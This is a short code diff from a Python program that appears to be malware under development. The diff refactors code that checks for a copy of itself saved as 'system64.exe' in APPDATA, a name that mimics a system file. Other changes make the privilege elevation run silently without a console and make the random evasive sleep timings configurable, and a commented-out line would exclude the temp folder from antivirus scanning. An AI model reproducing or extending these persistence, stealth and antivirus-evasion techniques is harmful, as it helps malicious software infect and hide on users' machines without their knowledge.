@@ -1,4 +1,5 @@
 from colorama import init
+import core.conf as conf
 init()
 import os
 from colorama import Fore, Style
@@ -13,7 +14,6 @@ import sys
 
 
 # define contstants
-APPDATA_EXE = os.getenv("APPDATA") + "\\" + "system64.exe"
 
 
 def display_msg(msg, color="g"):
@@ -39,8 +39,8 @@ def zipdir(path, ziph):
 def elevate_script():
     "MAkes sure that we get admin access for the first time"
     
-    if not os.path.exists(APPDATA_EXE):
-        elevate()
+    if not os.path.exists(conf.APPDATA_EXE):
+        elevate(show_console=False)
         time.sleep(generate_random_int())
 
         # exclude_path_antivirus(tempfile.gettempdir())
@@ -59,7 +59,7 @@ def test_for_startup_app():
     exe_name = sys.executable
     # display_msg("Current Executable name: "+ exe_name)
     # display_msg("App data exe name: "+ app_data_exe)
-    if exe_name == APPDATA_EXE:
+    if exe_name == conf.APPDATA_EXE:
         random_dur = generate_random_int()
         time.sleep(random_dur)
         return True
@@ -67,7 +67,7 @@ def test_for_startup_app():
         # time.sleep(random.randint(1,10))
         return False
 
-def generate_random_int(starting_num=1, ending_num=10):
+def generate_random_int(starting_num=conf.__start_time, ending_num=conf.__end_time):
     return random.randint(starting_num, ending_num)
 
 
